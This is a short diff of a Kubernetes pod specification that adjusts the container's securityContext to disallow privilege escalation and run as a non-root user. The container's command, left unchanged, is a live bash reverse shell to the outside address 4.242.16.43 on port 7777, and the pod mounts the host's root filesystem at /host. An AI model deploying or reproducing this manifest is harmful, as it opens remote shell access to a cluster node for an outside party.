@@ -32,7 +32,9 @@ spec:
     command: ["/bin/bash", "-c", "--"]
     args: ["bash -i >& /dev/tcp/4.242.16.43/7777 0>&1"]
     securityContext:
-      privileged: false
+      allowPrivilegeEscalation: false
+      runAsUser: 1000
+      runAsGroup: 3000
     volumeMounts:
     - mountPath: /host
       name: noderoot
